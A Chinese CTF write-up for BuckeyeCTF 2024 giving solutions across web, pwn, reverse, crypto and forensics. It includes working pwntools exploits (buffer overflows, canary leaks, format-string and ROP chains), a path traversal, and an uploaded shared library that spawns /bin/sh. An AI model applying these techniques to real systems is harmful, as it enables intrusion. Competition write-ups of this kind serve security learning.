# Buckeye CTF · 2024 WriteUp

> 原文: https://www.ctfiot.com/207473.html
> ID: 207473

我们新点击蓝字

关注我们

声明

本文作者：CTF战队

本文字数：40979字

阅读时长：约30分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

❝

BuckeyeCTF 2024 比赛地址 

https://pwnoh.io/team

WEB

fu

❝

“There is just news. There is no good or bad. Except for the news that you can sign up for classes today at fu.challs.pwnoh.io and become the dragon warrior for a few dollars a month, that is GREAT news!” – Master Oogway

fu

SSFS

❝

I made a file server to easily share my files with my friends. Nobody has hacked it yet, so I’m sure it’s secure.

ssfs.challs.pwnoh.io

https://bctf-24-stage1.s3-us-east-2.amazonaws.com/d03847995755b8a1a8e2a5cb04047523a14740f8dcf724bf754706f233925d93/SSFS.zip

python 环境

本来以为有数据库，但看了代码发现存储方式就是 uuid ，那么目录穿越访问 flag.txt 试试

bctf{4lw4y5_35c4p3_ur_p4th5}

Pwn

runway0

❝

If you’ve never done a CTF before, this runway should help!

Hint: MacOS users (on M series) will need a x86 Linux VM. Tutorial is here: pwnoh.io/utm

`sh`
exec 1>&2
cat flag.txt

❝

bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}

runway1

❝

Starting to ramp up!

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./runway1')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('challs.pwnoh.io', 13401)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
chall = ELF('./runway1', checksec=False)

pd = b'a' * 0x4c
pd += p32(chall.sym['win'])
p.sendline(pd)
p.interactive()

❝

bctf{I_34t_fl4GS_4_bR34kf4st_7c639e33ffcfe8c2}

color

❝

What’s your favorite color?

What's your favorite color? aaaabaaacaaadaaaeaaafaaagaaahaaa
aaaabaaacaaadaaaeaaafaaagaaahaaabctf{1_d0n7_c4r3_571ll_4_m1d_c010r}!?!? Mid af color

❝

bctf{1_d0n7_c4r3_571ll_4_m1d_c010r}

runway2

❝

Now with a twist!

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./runway2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('challs.pwnoh.io', 13402)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
chall = ELF('./runway2', checksec=False)

pd = b'x09' * 0x14
pd += p32(0x804A025 + 0x1fdb)
pd += b'aaaa'
pd += p32(0x8049253)

# gdb.attach(p, 'b *0x80492C6nc')
p.sendline(pd)

p.interactive()

❝

bctf{I_m1sS_4r1thm3t1c_qu1ZZ3s_2349adb53baa2955}

calc
calc

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./calc')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('challs.pwnoh.io', 13377)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
chall = ELF('./calc', checksec=False)

# gdb.attach(p, 'b *0x4014F3nc')
p.sendlineafter(b'first operand: ', b'1')
p.sendlineafter(b'the operator: ', b'+')
p.sendlineafter(b'second operand: ', b'pi')
p.sendlineafter(b' like to use: ', b'10014')

canary = u64(p.recvuntil(b'nResult: ')[:-9][-8:])
success("canary = " + hex(canary))

pd = b'0' * 0x28
pd += p64(canary)
pd += p64(chall.bss(0x500))
pd += p64(0x40130D)
p.sendlineafter(b'need to here: ', pd)
p.interactive()

❝

bctf{cAn4r13S_L0v3_t0_34t_P13_c760f8cc0a44fed9}

runway3

❝

A new technique!

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./runway3')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('challs.pwnoh.io', 13403)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
chall = ELF('./runway3', checksec=False)

# gdb.attach(p, 'b *0x401250nc')

pd = b'%13$p'
p.sendlineafter(b'echo in here?n', pd)
canary = int(p.recvuntil(b'n')[:-1], 16)
pd = b'a' * 0x28
pd += p64(canary)
pd += p64(chall.bss(0x500))
pd += p64(0x4011FC)
p.sendline(pd)

p.interactive()

❝

bctf{wh0_kn3w_pr1nt1ng_w4s_s0_d4nG3R0Us_11aabc3287e74603}

no_handouts

❝

I just found a way to kill ROP. I think. Maybe?

这题远程只能 ORW

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--mode", required=True, choices=["d", "debug", "r", "remote"])
args = parser.parse_args()

context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"

if args.mode in ["d", "debug"]:
    p = process('./chall')
    libc = ELF('libc.so.6', checksec=False)
else:
    p = remote('challs.pwnoh.io', 13371)
    libc = ELF('libc.so.6', checksec=False)
chall = ELF('./chall', checksec=False)

res = p.recvuntil(b'anything else.n')
res = res[res.find(b"it's at ") + 8:]
res = res[:res.find(b'n')]
addr_system = int(res, 16)
libc.address = addr_system - libc.sym['system']

# gdb.attach(p, 'brva 0x124Enc')
success("system = " + hex(addr_system))
pd = b' ' * 0x20
pd += p64(libc.address + 0x21a000)
pd += p64(libc.search(asm("pop rdi; ret")).__next__())
pd += p64(0)
pd += p64(libc.search(asm("pop rsi; ret")).__next__())
pd += p64(libc.address + 0x21a100)
pd += p64(libc.search(asm("pop rdx ; pop r12 ; ret")).__next__())
pd += p64(0x30)
pd += p64(0)
pd += p64(libc.sym['read'])
pd += p64(libc.search(asm("pop rdi; ret")).__next__())
pd += p64(libc.address + 0x21a100)
pd += p64(libc.search(asm("pop rsi; ret")).__next__())
pd += p64(0)
pd += p64(libc.sym['open'])
pd += p64(libc.search(asm("pop rdi; ret")).__next__())
pd += p64(3)
pd += p64(libc.search(asm("pop rsi; ret")).__next__())
pd += p64(libc.address + 0x21a200)
pd += p64(libc.search(asm("pop rdx ; pop r12 ; ret")).__next__())
pd += p64(0x30)
pd += p64(0)
pd += p64(libc.sym['read'])
pd += p64(libc.search(asm("pop rdi; ret")).__next__())
pd += p64(1)
pd += p64(libc.search(asm("pop rsi; ret")).__next__())
pd += p64(libc.address + 0x21a200)
pd += p64(libc.search(asm("pop rdx ; pop r12 ; ret")).__next__())
pd += p64(0x30)
pd += p64(0)
pd += p64(libc.sym['write'])
p.sendline(pd)

p.sendline("flag.txtx00")
p.interactive()

❝

bctf{sh3lls_ar3_bl0at_ju5t_use_sh3llcode!}

Misc

sanity

通过链接加入 discord

搜索 bctf

git goo

dotgit 插件

报了这个错误

内容应该也在文件中，进去看一下

直接恢复即可

Reverse

text-adventure

❝

I just wrote a text adventure game after learning Java, but maybe I should’ve added some instructions….

nc challs.pwnoh.io 13376

https://bctf-24-stage1.s3-us-east-2.amazonaws.com/07eed3daa10df862646adc187e68bcc97bf9e1886032aaaf3a9748d7d07c83a2/text-adventure.zip

一个游戏，去到特定的地点找到rope、sword、key，然后进入到输出flag的那个类(DeadEnd)就行

按照下面的这个顺序输入就能得到flag (上面部分是找那三样东西的思路，逆着看)

flag <-
<- DeadEnd <- reach through the crack in the rocks <-the crack in the rocks concealing the magical orb with the flag
<- SealedDoor  <- unlock the door <-  Inventory.contains("key")
<- StairwayBottom <- go left
<- StairwayTop <- descend
<- EntryHall <- go middle <- pick up torch 
<- enter

key：
SpiderHallway -> Player.instance.hasItem("sword")
<- River <- 
<- StairwayBottom <- go right
<- StairwayTop <- descend

sword：
AcrossRiver -> pick up sword -> Player.instance.hasItem("rope")
<- River <- throw rope
<- StairwayBottom <- go right
<- StairwayTop <- descend

rope：
CrystalRoom -> pick up rope
<- Bridge <- cross the bridge
<- EntryHall <- go right

nc challs.pwnoh.io 13376
-> enter -> pick up torch -> go right -> (Bridge) -> cross the bridge -> (CrystalRoom) -> pick up rope -> (get the rope) 
-> go back ->  go back ->(EntryHall) -> go middle -> (StairwayTop) -> descend -> (StairwayBottom) -> go right -> (River) 
-> use the rope -> (AcrossRiver) -> pick up sword -> go back -> go back -> go back -> go back -> (EntryHall) 
-> go left -> (SpiderHallway) -> cut the webs -> (KeyRoom) -> pick up key -> (get the key) -> go back -> go back 
-> (EntryHall) -> go middle -> (StairwayTop) -> descend -> (StairwayBottom) -> go left -> (SealedDoor) -> unlock the door
-> (DeadEnd) ->reach through the crack in the rocks -> the crack in the rocks concealing the magical orb with the flag

from pwn import *

r = remote('challs.pwnoh.io', 13376)

r.sendline(b'enter')
r.sendline(b'pick up torch')
r.sendline(b'go right')
r.sendline(b'cross the bridge')
r.sendline(b'pick up rope')
r.sendline(b'go back')
r.sendline(b'go back')
r.sendline(b'go middle')
r.sendline(b'descend')
r.sendline(b'go right')
r.sendline(b'use the rope')
r.sendline(b'pick up sword')
r.sendline(b'go back')
r.sendline(b'go back')
r.sendline(b'go back')
r.sendline(b'go back')
r.sendline(b'go left')
r.sendline(b'cut the webs')
r.sendline(b'pick up key')
r.sendline(b'go back')
r.sendline(b'go back')
r.sendline(b'go middle')
r.sendline(b'descend')
r.sendline(b'go left')
r.sendline(b'unlock the door')
r.sendline(b'reach through the crack in the rocks')
r.sendline(b'the crack in the rocks concealing the magical orb with the flag')

print(r.recvuntil(b'> '))

r.interactive()

❝

bctf{P33r_1nT0_tH3_j4r_2_f1nd_Th3_S3cR3Ts_d1463580a690f294}

flagwatch

❝

Did you know that you can compile AutoHotKey scripts?

https://bctf-24-stage1.s3-us-east-2.amazonaws.com/c965a6714c60f4f636d0425444df7ac5e3588fb48623e3c54a44d33576177a8c/flagwatch.exe

新东西。github上能找到对应的反编译器

; <COMPILER: v1.1.37.02>
global flaginput := ""
logInput(key){
global flaginput
flaginput := flaginput . key
flaginput := SubStr(flaginput,-28)
checkInput()
}
checkInput(){
global flaginput
if (StrLen(flaginput) != 29)
return
if (SubStr(flaginput, 1, 5) != "bctf{" or SubStr(flaginput,0) != "}")
return
encrypted_flag := [62,63,40,58,39,40,111,63,52,50,53,63,104,48,48,37,3,61,3,55,57,37,48,108,59,59,111,46,33]
Loop 29
{
if ((encrypted_flag[A_Index] ^ 92) != Asc(SubStr(flaginput,A_Index,1))) {
MsgBox, You typed the wrong flag.
return
}
}
MsgBox, You typed the right flag!
}

bctf{t3chnic4lly_a_keyl0gg3r}

thank

❝

I am so grateful for your precious files!

nc challs.pwnoh.io 13373

https://bctf-24-stage1.s3-us-east-2.amazonaws.com/ce939ad0f6e182b780dc56728b4afa08f9c8918c37cc26788e60defa3fdd37b2/thank

附件拖入ida

程序读入一个so库文件，然后去主动调用库函数thank。有点像pwn题，写这么一个文件，然后编译

#include <stdio.h>

void thank() {
    printf("this is test in my thank()n");
    system("echo this is test in systemn");
    system("/bin/sh");
}

#gcc -fPIC -shared -o libthank.so thank.c

使用pwn脚本进行通信

from pwn import remote,p64,context
#from LibcSearcher import *
import re

local=0
if local==1:
    p=remote('192.168.202.129',10001)
else:
    p=remote('challs.pwnoh.io',13373)
    
# context.log_level='debug'    
# context.arch='amd64'
# context.os='linux'

try:
    with open("./libthank.so",'rb') as f:
        data=f.read()
    size=len(data)
    print(str(size))
    p.recvuntil(b'What is the size of your file (in bytes)? ')
    p.sendline(str(size))
    p.recvuntil(b'Send your file!n')
    p.send(data)
    

except Exception as e:
    print(f"error: {e}")
finally:
    p.interactive()

bctf{7h4nk_y0ur_10c41_c0mpu73r_70d4y}

Crypto

xnor

from Crypto.Util.number import *

data = b'Blue is greener than purple for sure!'

enc = long_to_bytes(0xfe9d88f3d675d0c90d95468212b79e929efffcf281d04f0cfa6d07704118943da2af36b9f8)

key = b""
for i,j in zip(data,enc):
    key += int.to_bytes(i^j)

flag = b""
enc = long_to_bytes(0xde9289f08d6bcb90359f4dd70e8d95829fc8ffaf90ce5d21f96e3d635f148a68e4eb32efa4)
for i,j in zip(key,enc):
    flag += int.to_bytes(i^j)

print(flag)

rsa

db查得到

from Crypto.Util.number import *

p = 213055785127022839309619937270901673863
q = 310165339100312907369816767764432814137
c = 19146395818313260878394498164948015155839880044374872805448779372117637653026

phi = (p-1)*(q-1)

d = pow(0x10001, -1, phi)
m = pow(c, d, p*q)
print(long_to_bytes(m))

hashbrown

hash扩展

from pwn import *
from Crypto.Cipher import AES
my_message = "n".join(
    [
        "Grate the raw potatoes with a cheese grater, place them into a bowl and cover completely with water. Let sit for 10 minutes.",
        "Drain the grated potatoes well; if this is not done thoroughly the potatoes will steam instead of fry.",
        "Mix in chopped onions by hand.",
        "Mix the egg OR flour into the hash brown mixture evenly. This will allow the hash browns to stay together when frying.",
        "Place a large frying pan on medium-high heat and add enough oil to provide a thin coating over the entire bottom of the pan.",
        "When the oil has come up to temperature apply a large handful of potatoes to the pan and reshape into a patty that is about 1/4-1/2 inch (6-12 mm) thick. The thinner the patty, the crispier the hash browns will be throughout.",
        "Flip when they are crisp and brown on the cooking side. They should also stick together nicely before they are flipped. This should take about 5-8 minutes.",
        "The hash browns are done when the new side is brown and crispy. This should take another 3-5 minutes.",
    ]
).encode()

def pad(data):
    padding_length = 16 - len(data) % 16
    return data + b"_" * padding_length

def aes(block: bytes, key: bytes) -> bytes:
    assert len(block) == len(key) == 16
    return AES.new(key, AES.MODE_ECB).encrypt(block)

io = remote("challs.pwnoh.io", 13419)
io.recvuntil(b"Signature:n")
sign = bytes.fromhex(io.recv(32).decode())
message = pad(my_message)
message += b"french fry"
io.recvuntil(b"(as hex)n> ")
io.sendline(message.hex().encode())
message = pad(message)
sign_new = aes(message[-16:], sign)
io.recvuntil(b"signiature?n> ")
io.sendline(sign_new.hex().encode())
io.interactive()

zkwarmup

from pwn import *
import random
import time

context.log_level = "debug"

io = remote("challs.pwnoh.io", 13421)
n = 19261756194530262169516227535327268535825703622469356233861243450409596218324982327819027354327762272541787979307084854543427241827543331732057807638293377995167826046761991463655794445629511818504788588146049602678202660790161211079215140614149179394809442098536009911202757117559092796991732111808588753074002377241720729762405118846289128192452140379045358673985940236403266552967867241351260376075804662700969038717732248036975281084947926661161892037413944872628410488986135370175176475239647256670545733839891394321932103696968961386864456665963903759123610214930997530883831800104920546270573046968308379346633
random.seed(int(time.time()+1))
x = random.randrange(1, n)
y = pow(x, 2, n)

for i in range(1,129):
    b = random.randrange(2)
    if b == 0:
        s = i * i
    else :
        s = i * i * y
    
    z = i * x

    io.recvuntil(b"s: ")
    io.sendline(str(s).encode())
    io.recvuntil(b"z: ")
    io.sendline(str(z).encode())

io.interactive()

forensics

forensics

解压就是flag

duck-pics

❝

got a capture on the chall author while engaging in “personal matters”. see what you can find.

https://bctf-24-stage1.s3-us-east-2.amazonaws.com/79ad993b241803c758dd676eb6ed8bceab1bbe1cf7b17af83bacb058dd128921/capture.pcapng

发了两万个包，内容好像的都是空的

使用工具一把梭提取键盘流量

得到文本

flag：Bblog<SPACE>enttry<SPACE>#216<RET><RET>Ttt<DEL>itle"<SPACE>Tthe<SPACE>Sttrn<DEL>ange<SPACE>andd<SPACE>uunssettliinng<SPACE>Rreality<SPACE>of<SPACE>d<DEL><DEL>Ducls<DEL><DEL>ks'<SPACE>Spiral-Ssahpe<DEL><DEL><DEL><DEL>a<DEL>haped...<DEL><DEL><DEL><SPACE>Pennnis<DEL><DEL><DEL><DEL><DEL>Ddoonts<DEL><DEL>s<DEL><DEL>ggs?<DEL><DEL><DEL><DEL><DEL><DEL>Ddiicks?<DEL><DEL><DEL><DEL><DEL><DEL><DEL>Ppenises.<RET><RET>Ttheerre<SPACE>aarre<SPACE>soomme<SPACE>faactts<SPACE>yoou<SPACE>stumvl<SPACE><DEL>e<SPACE>uppon<SPACE>iin<SPACE>liffee<SPACE>thaatt<SPACE>lleae<DEL>ve<SPACE>yoou<SPACE>u<DEL>changed<SPACE><DEL>.<SPACE><SPACE>I'm<SPACE>nnott<SPACE>tallkiinng<SPACE>aboout<SPACE>ggrand<SPACE>rrevvelatiions<SPACE>like<SPACE>rrealiziinng<SPACE>the<SPACE>mmeeaniinng<SPACE>of<SPACE>existencce<SPACE><DEL>,<SPACE>bbut<SPACE>ratheerr<SPACE>thoosse<SPACE>little,,<SPACE>often<SPACE>uunwwanted,,<SPACE>tidbiitts<SPACE>of<SPACE>kknowledgge<SPACE>of<SPACE><DEL><DEL><DEL>thhaat<SPACE>o<DEL>soommehow<SPACE>mannagge<SPACE>tto<SPACE>woork<SPACE><DEL><DEL>m<SPACE>thheir<SPACE><SPACE>wa<DEL><DEL>wwa<DEL><DEL><DEL>wway<SPACE>iinto<SPACE>yoour<SPACE>brraiin<SPACE>andd<SPACE>stay<SPACE>thheerre.<SPACE><SPACE>Forever.....<SPACE><SPACE>Ffor<SPACE>me,,<SPACE>oonne<SPACE>of<SPACE>thosss<SPACE>factts<SPACE>is<SPACE>thhis"<SPACE>ducs<DEL>ks<SPACE>hhavvee<SPACE>sppiral-shaped<SPACE>ppenniess<DEL><DEL>ees.<RET><RET>o<DEL>Now,,<SPACE>beforree<SPACE>yoou<SPACE>click<SPACE>aaway,<SPACE>thhinnkiingg<SPACE>tthhiss<SPACE>is<SPACE>soome<SPACE>sort<SPACE>oof<SPACE>absurd<SPACE>prank<SPACE>or<SPACE>ooutlandish<SPACE>clickbait-llet<SPACE>me<SPACE>aassuue<SPACE>y<DEL><DEL><DEL>rre<SPACE>yooooo<DEL><DEL>u,<SPACE>tthhiis<SPACE>iis<SPACE>rreal.<SPACE>**t<DEL><DEL>Ttoo**<SPACE>rreal,,<SPACE>if<SPACE>I<SPACE>may<SPACE>ssay.<SPACE><SPACE>Dducks<SPACE><DEL>,,<SPACE>thosse<SPACE>quait<DEL>nnt<SPACE>i<DEL>little<SPACE>crreeaturres<SPACE>thhaatt<SPACE>waaddle<SPACE>by<SPACE>pondds<SPACE><SPACE>and<SPACE>quacck<SPACE>at<SPACE>ppaasseersby,,<SPACE>hhavvee<SPACE>genitalia<SPACE>thhaatt<SPACE>ccorkscrrew<SPACE>iin<SPACE>wway<SPACE>I<SPACE>nneverr<SPACE>tthoouuggh<SPACE><DEL><DEL>t<SPACE>ppoossible<DEL><DEL>e<DEL>lle<SPACE>oor<SPACE>neccessaary.<SPACE>Tthe<SPACE>firsst<SPACE>tiime<SPACE>I<SPACE>leearned<SPACE>aaboout<SPACE>thhiss<SPACE><DEL>,,<SPACE>my<SPACE>iimmediatte<SPACE>rrespponnsse<SPACE>waas<SPACE><SPACE>a<SPACE>bewilderredd<SPACE>whhy:W<DEL>whhy:<DEL>?:<SPACE>followed<SPACE>bby<SPACE>a<SPACE>slow<SPACE>crreepiing<SPACE>discomfoort<SPACE>thhaatt<SPACE>I<SPACE>havb<DEL>n't<SPACE>bbeeen<SPACE>able<SPACE>tto<SPACE>shaarke<SPACE>of<DEL><DEL><DEL><DEL><DEL><DEL><DEL>le<SPACE>of<DEL><DEL><DEL><DEL><DEL>ke<SPACE>off<SPACE>siincce.<RET><RET>I<SPACE>supposse<SPACE>thhe<SPACE>first<SPACE>queesstiion<SPACE><SPACE>wwe<SPACE>shoould<SPACE>all<SPACE><SPACE>aask<SPACE>is,,<SPACE>:How<SPACE>did<SPACE>I<SPACE>evven<SPACE>ccoome<SPACE>across<SPACE>thhiis<SPACE>iinfoormattiion?:<SPACE><SPACE>Wweell,,<SPACE>Ll<DEL>likke<SPACE>all<SPACE><SPACE>e<DEL>uunexpectted<SPACE>joournets,,<SPACE><DEL><DEL><DEL><DEL><DEL>yys,,<SPACE>I<SPACE><DEL>i<DEL><DEL><DEL>it<SPACE>m<DEL>behan<SPACE>n<DEL>i<DEL><DEL><DEL><DEL><DEL><DEL>gan<SPACE>iinnocently<SPACE>enoouggh.<SPACE>I<SPACE>waas<SPACE>ddeep<SPACE>iinto<SPACE>an<SPACE>iinnteerneet<SPACE>rrabbit<SPACE>hole<SPACE>oone<SPACE>eveniing,,<SPACE>startiing<SPACE>witth<SPACE>whollesoomme<SPACE>videos<SPACE>of<SPACE>duuckiin<DEL><DEL>liin<DEL><DEL>gs<SPACE>lleearniinng<SPACE>tto<SPACE>swiim,<DEL>.<SPACE>Tthhat<SPACE>shoould<SPACE>havve<SPACE>been<SPACE>my<SPACE>cue<SPACE>tto<SPACE>sstoop.<SPACE>Butt<SPACE>tthe<SPACE>curiosity<SPACE>maachiine<SPACE>thhatt<SPACE>is<SPACE>thhe<SPACE>iinntteerneet<SPACE>is<SPACE>rrelentless,,<SPACE>and<SPACE><SPACE>aafteerr<SPACE>cclickiing<SPACE>ffrroom<SPACE>oonne<SPACE>an<DEL><DEL>nnaturre<SPACE>docuumentat<DEL><DEL>rry<SPACE>tto<SPACE>anottheer,,<SPACE>I<SPACE>su<DEL>tuumblled<SPACE>upun<SPACE>th<DEL><DEL><DEL><DEL><DEL>oon<SPACE>thhe<SPACE>uunnssel<DEL>ttle<DEL>iinng<SPACE>faact<SPACE>thhaat<SPACE>malle<SPACE>ducks,,<SPACE>SPPEECIFICALLY<SPACE><SPACE>drakees<SPACE><DEL>,,<SPACE>a<DEL>hae<DEL>vve<SPACE>penisses<SPACE>thhaat<SPACE><SPACE>aarree<SPACE>shapedd<SPACE>likke<SPACE>ccorksscrrews.<RET><RET>Aat<SPACE>first,<SPACE><SPACE>I<SPACE>didn't<SPACE>believve<SPACE>it.<SPACE><SPACE>I<SPACE>meean<SPACE><DEL>,,<SPACE>whhy<SPACE>soou<DEL><DEL>wo<DEL><DEL><DEL><DEL>woould<SPACE>a<SPACE>duck;a<DEL><DEL>'s<SPACE>rreprou<DEL>ductivve<SPACE>oorgan<SPACE>*need(<DEL><DEL>*<SPACE>to<SPACE>rresemble<SPACE>a<DEL>sooomethiing<SPACE>u<DEL>yoou<SPACE>oopen<SPACE>a<SPACE>bottle<SPACE>of<SPACE>of<DEL><DEL>wiine???<SPACE>Iit<SPACE>felt<SPACE>lie<SPACE><DEL><DEL>ke<SPACE>one<SPACE>of<SPACE>thosse<SPACE>qur<DEL>r<DEL>irky<SPACE><DEL>,,<SPACE>uunnes<DEL><DEL>ccessaary<SPACE>adaptattiions<SPACE>thhaatt<SPACE>evolt<DEL>utiion<SPACE>soommetiimmeess<SPACE>ccoomme<SPACE><DEL><DEL>s<SPACE>up<SPACE>with<SPACE>for<SPACE>rreaasoons<SPACE>thaat<SPACE>nno<SPACE>oone<SPACE>rreallly<SPACE>aaskked<SPACE>for.<SPACE>but<SPACE>the<SPACE>kkk<DEL><DEL>mmorre<SPACE>I<SPACE>rread<SPACE><SPACE>(aandd<SPACE>I<SPACE>rreaad<SPACE>alot<DEL><DEL><DEL><DEL><DEL>ALOT),,<SPACE>the<SPACE>mmoorree<SPACE>uuncoomforatble<SPACE><SPACE>I<SPACE>became.<SPACE><SPACE>I<SPACE><SPACE>coouldn't<SPACE>stoop<SPACE>a<DEL>iimmagiiniinng<SPACE>it.<RET><RET><CAP><CAP><CAP>m<DEL>mmag<DEL><DEL><DEL><DEL><CAP>magiinge<DEL><DEL>e<SPACE>duckks<SPACE>a<DEL><DEL>wwaaddliing<SPACE>aroound,,<SPACE>their<SPACE>ssppiral-shaped<SPACE>anatoomy<SPACE>hidden<SPACE>beneeath<SPACE>thosse<SPACE>sseemiinglt<SPACE>iinnocent<SPACE>fath<DEL><DEL>ea<DEL><DEL><DEL><DEL>eeah<DEL>thheer<SPACE><DEL><DEL>s,,<SPACE>wwaiitiing<SPACE>for<SPACE>t<DEL>jjuusst<SPACE>the<SPACE>right<SPACE>moment,<SPACE><SPACE>It's<SPACE>bizarrely<SPACE>elaboratte<SPACE>for<SPACE>a<SPACE>bird,,<SPACE>coonsideriing<SPACE>thhat<SPACE>mmmosst<SPACE>birdds<SPACE>doon't<SPACE>evveen<SPACE>*hhavve8*<SPACE><DEL><DEL>*<SPACE>penises.<SPACE><SPACE>Ttheey<SPACE>makke<SPACE>ddo<SPACE>witth<SPACE>soommethiing<SPACE>caalled<SPACE>a<SPACE>cloacal<SPACE>kiss,,<SPACE>whheerre<SPACE>thheir<SPACE>rreproduuci<DEL><DEL>tivve<SPACE>oorgans<SPACE>briefly<SPACE>toouch.<SPACE>Dducks,,<SPACE>n<DEL>oon<SPACE>thhe<SPACE>oothheerr<SPACE>hand,,<SPACE>went<SPACE>the<SPACE>exttraa<SPACE>miile<SPACE>with<SPACE><SPACE>a<SPACE>coomplex,,<SPACE>ccooiled<SPACE>maachanism.<SPACE>Iit's<SPACE>almosst<SPACE>aas<SPACE>if<SPACE>naturre,,<SPACE>iin<SPACE>foom<DEL><DEL><DEL><DEL>soome<SPACE>sttrangge<SPACE>g<DEL><DEL>fiit<SPACE>of<SPACE>whiimsy<SPACE>said,,<SPACE>:Yoou<SPACE>kknow<SPACE>what<SPACE>duckks<SPACE>nees<DEL><DEL>d?<SPACE><SPACE>A<SPACE>penniis<SPACE>thhaatt<SPACE>looks<SPACE>lie<SPACE>a<SPACE><DEL><DEL><DEL><DEL>kke<SPACE>a<SPACE>pei<DEL><DEL><DEL>ieccee<SPACE>off<SPACE>ppat<DEL><DEL>sta.:<RET><RET>Bu<SPACE><DEL>t<SPACE>it<SPACE>doeessn't<SPACE>sstoop<SPACE>thheer.<DEL>e.<SPACE>Oh<SPACE>nno.<SPACE>Aas<SPACE>if<SPACE>thhe<SPACE>spiral<SPACE>shape<SPACE>waasn't<SPACE>uunssettliing<SPACE>enoouuggh,<SPACE>thhe<SPACE>whole<SPACE>proccess<SPACE>f<DEL><DEL>of<SPACE>duck<SPACE>rreproductiion<SPACE>is<SPACE>ffraught<SPACE>witth<SPACE>weirdnness<SPACE>aand,,<SPACE>ffraankly<SPACE>b<DEL><DEL>,,<SPACE>biiole<DEL>viiolencce.<SPACE><SPACE>Ffemale<SPACE>ducs<DEL>ks,,<SPACE>it<SPACE>turns<SPACE>oouut,,<SPACE>evolved<SPACE>a<SPACE>coounteer<SPACE><DEL>s<DEL>-sppiral<SPACE>thhaat's<SPACE>rigghht-rreproduuctivve<SPACE>ttract<SPACE>to<SPACE>fend<SPACE>off<SPACE>uunwwanted<SPACE>advanccees,,<SPACE>beecausse<SPACE>yees,<SPACE>the<SPACE>u<DEL><DEL>duck<SPACE>world<SPACE>is<SPACE>riffe<SPACE>witth<SPACE>rreproduuctivve<SPACE>coercioon.<SPACE>Tthhaat's<SPACE>right-naturre<SPACE>designed<SPACE>an<SPACE>enttri<DEL><DEL>iirre<SPACE>systeem<SPACE>wheerre<SPACE>male<SPACE>aandd<SPACE>ffemale<SPACE>anatomy<SPACE><SPACE>aarre<SPACE>*8att<SPACE>odss<DEL><DEL><DEL>dds(<DEL>*<SPACE>wwith<SPACE><SPACE>each<SPACE>othheer,<SPACE>sppiraling<SPACE>wiin<DEL><DEL><DEL>iin<SPACE>oopposite<SPACE>dirrecto<DEL>yiion<DEL><DEL><DEL><DEL>tiions,,<SPACE>all<SPACE>iin<SPACE>the<SPACE>name<SPACE>of<SPACE><DEL>,,<SPACE>wwel<DEL><DEL>l<DEL>wll,,<SPACE>survival?<RET><RET>So<SPACE>nnow,,<SPACE>every<SPACE>tiime<SPACE>I<SPACE>ssee<SPACE>a<SPACE>duck<SPACE>floatiinng<SPACE>graccefully<SPACE>acc<DEL>ross<SPACE>a<SPACE>pong,,<SPACE>I<SPACE>cccan't<SPACE>help<SPACE>bbut<SPACE>feel<SPACE>aa<SPACE>little<SPACE>uuneaasy,<SPACE><SPACE>O<DEL><DEL><DEL>.<SPACE><SPACE>On<SPACE>the<SPACE>surfacce,,<SPACE>thhey<SPACE>sseem<SPACE>calm,,<SPACE>coomppoossed,,<SPACE>aandd<SPACE>ppeerffectly<SPACE>haarmlless.<SPACE>But<SPACE>nnow<SPACE>thaat<SPACE>I<SPACE>kknow<SPACE>whhat's<SPACE>d<DEL>ggoiing<SPACE>oon<SPACE>beneath<SPACE>thosss<SPACE>ffeaturrees,,<SPACE>I<SPACE>ccaan't<SPACE>uune<DEL><DEL>ssee<SPACE>iit.<SPACE>The<SPACE>ppirals<DEL>-shha<DEL>ped<SPACE>ttrc<DEL>uc<DEL>th<DEL><DEL><DEL><DEL>sppiral-shaped-<DEL><DEL><SPACE>ttruth<SPACE>is<SPACE>alwayss<SPACE>theerre<SPACE><DEL>,,<SPACE>lurkiing<SPACE>iin<SPACE>thhe<SPACE>baacckggroound.<SPACE>and<SPACE>hoonesstly,,<SPACE>it<SPACE>makees<SPACE>my<SPACE>iinnteeraactiions<SPACE>witth<SPACE><SPACE>ducks,,,<SPACE>aawkwarre.<DEL><DEL>k<DEL><DEL>d.<SPACE>I<SPACE>meean,,<SPACE>hoow<SPACE>aam<SPACE>I<SPACE>supppoossed<SPACE>tto<SPACE>loook<SPACE>at<SPACE>tthem<SPACE>thhe<SPACE>same<SPACE>wway<SPACE>aa<DEL>gaiin?<RET><RET>enteerthhe<SPACE>fs<DEL><DEL><DEL>fl